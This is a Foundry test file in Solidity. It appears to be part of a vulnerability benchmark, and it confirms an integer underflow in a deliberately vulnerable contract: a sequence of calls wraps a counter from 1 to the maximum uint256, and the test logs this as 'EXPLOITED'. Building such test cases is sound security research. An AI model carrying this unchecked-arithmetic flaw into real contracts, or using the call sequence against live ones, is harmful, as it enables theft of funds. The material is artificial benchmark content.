// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_multitx_multifunc_feasible.sol";

contract IntegerOverflowMultiTxMultiFuncFeasibleTest is Test {
    IntegerOverflowMultiTxMultiFuncFeasible public vulnerable;
    
    function setUp() public {
        vulnerable = new IntegerOverflowMultiTxMultiFuncFeasible();
    }

    function test_IntegerUnderflow() public {
        // Initialize contract to enable state changes
        vulnerable.init();

        // Reset count to known value (sets count to 1 based on actual contract behavior)
        vulnerable.resetCount();

        // Differential verification setup
        uint256 preCount = vulnerable.count();
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Counter value before run(2):", preCount);
        
        console2.log("--- Trigger Operation: run(2) ---");
        // Trigger underflow by subtracting 2 from 1 (should wrap around to max uint256)
        vulnerable.run(2);

        // Capture state after trigger
        uint256 postCount = vulnerable.count();
        console2.log("--- AFTER-Trigger State ---");
        console2.log("Counter value after run(2):", postCount);

        // Compare state changes
        bool underflowOccurred = (preCount == 1 && postCount == type(uint256).max);
        console2.log("State changed:", underflowOccurred ? "YES" : "NO");
        console2.log("Underflow vulnerability:", underflowOccurred ? "EXPLOITED" : "NOT EXPLOITED");

        // Final verdict
        if (underflowOccurred) {
            console2.log("Vulnerability Exists: Integer underflow successfully changed counter from 1 to max uint256");
        } else {
            console2.log("Vulnerability not Exist: Counter value remained %s (expected underflow to max uint256)", postCount);
        }

        // Verify underflow occurred (original assertion)
        assertEq(vulnerable.count(), type(uint256).max);
    }
}